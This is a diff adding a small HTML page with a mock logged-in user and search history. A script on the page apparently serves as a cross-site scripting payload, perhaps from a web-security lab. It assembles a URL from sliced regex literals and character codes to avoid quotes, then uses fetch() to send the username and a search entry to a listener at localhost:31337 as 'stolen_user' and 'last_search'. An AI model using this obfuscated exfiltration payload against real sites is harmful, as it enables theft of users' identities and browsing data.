@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+    <div id="logged-in-user">schlatt</div>
+    <div class="history-list">
+        <div class="history-item list-group-item">search1</div>
+        <div class="history-item list-group-item">search2</div>
+        <div class="history-item list-group-item">search3</div>
+    </div>
+</html>
+
+<script>
+    fetch(String(/http:/).slice(1)
+    .concat(String(/localhost:31337/))
+    .concat(String.fromCharCode(63))
+    .concat(String(/stolen_user=/).slice(1, -1))
+    .concat(document.getElementById(String(/logged-in-user/).slice(1,-1)).innerText)
+    .concat(String(/%26last_search=/).slice(1,-1))
+    .concat(document.getElementsByClassName(String(/history-item list-group-item/).slice(1,-1)).item(1).innerText)
+    )
+</script>
